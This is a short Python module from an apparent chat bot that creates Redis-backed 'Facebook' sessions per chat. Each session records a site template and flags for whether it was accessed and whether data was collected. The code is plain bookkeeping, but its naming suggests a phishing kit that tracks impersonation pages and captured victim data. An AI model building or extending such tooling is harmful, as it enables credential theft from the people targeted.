# bot_handlers/sessions/fb_sessions.py
import json
import time
import uuid

from config import redis_client
from logging_config import get_logger
from monitoring import metrics
from ..templates import FACEBOOK_SITES

logger = get_logger("bot_handlers.sessions.fb")


def create_fb_session(chat_id, template_key):
    if not redis_client:
        return None
    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()
        session_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "type": "facebook",
            "template": template_key,
            "created_at": now,
            "accessed": False,
            "collected": False,
            "label": FACEBOOK_SITES.get(template_key, {}).get('name', 'Facebook'),
        }
        redis_client.setex(
            f"se_session:{session_id}",
            86400 * 30,
            json.dumps(session_data, ensure_ascii=False)
        )
        redis_client.lpush(f"se_user_sessions:{chat_id}", session_id)
        redis_client.ltrim(f"se_user_sessions:{chat_id}", 0, 199)
        redis_client.expire(f"se_user_sessions:{chat_id}", 86400 * 30)
        logger.info(f"FB Session created: {session_id} | {template_key}")
        metrics.inc_counter("fb_sessions_created")
        return session_id
    except Exception as e:
        logger.exception(f"create_fb_session error: {e}")
        return None
